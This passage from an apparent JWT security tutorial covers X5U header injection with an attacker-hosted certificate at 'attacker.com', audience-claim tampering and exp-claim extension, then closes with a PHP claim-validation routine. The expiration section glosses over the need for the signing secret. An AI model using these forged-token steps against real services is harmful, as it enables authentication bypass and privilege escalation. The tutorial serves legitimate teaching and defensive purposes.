## X5U Injection

X5U = X.509 Certificate URL. Similar to JKU but with certificates:

```json
{
  "alg": "RS256",
  "x5u": "https://attacker.com/malicious-cert.pem"
}
```

**Attack:** Server fetches certificate from attacker URL and uses it for validation!

### X5U Exploitation

```bash
# 1. Generate certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# 2. Create token with x5u
TOKEN_HEADERS='{"alg":"RS256","x5u":"https://attacker.com/cert.pem"}'

# 3. Host certificate
python3 -m http.server 8000

# 4. Submit token
# Server fetches from attacker URL = uses attacker's cert
```

## Audience Claim Bypass

Audience claim not properly validated:

```json
// Original token
{"aud": "app-1"}

// Modified token
{"aud": "app-admin"}
```

If validation loose:
```php
// BAD
if (isset($token->aud)) {
    // Accept any audience
}

// GOOD
if ($token->aud != 'expected_audience') {
    die('Invalid audience');
}
```

**Attack:** Change audience to access other apps!

## Expiration Bypass

Extend token lifetime indefinitely:

```python
import jwt

payload = {
    "role": "admin",
    "sub": "123",
    "exp": 9999999999  # Year 2286!
}

token = jwt.encode(payload, secret, algorithm="HS256")
```

**Original:** Token expires in 1 hour
**Modified:** Token never expires!

### Why It Works

```
Server checks: if current_time > exp_time: deny
If exp = 9999999999:
- Current time always < 9999999999
- Token always valid
- Never expires!
```

## Prevention

```php
// Validate EVERY claim
function validate_token($token) {
    // 1. Validate signature
    if (!JWT::validate_signature($token)) die();
    
    // 2. Validate algorithm
    if ($token->alg != 'RS256') die();
    
    // 3. Validate audience
    if ($token->aud != 'expected_audience') die();
    
    // 4. Validate expiration
    if ($token->exp < time()) die();
    
    // 5. Fetch user from database
    $user = DB::find($token->sub);
    if (!$user) die();
    
    // 6. Verify role from database (NOT token)
    if ($user->role != 'admin') die();
    
    return true;
}
```
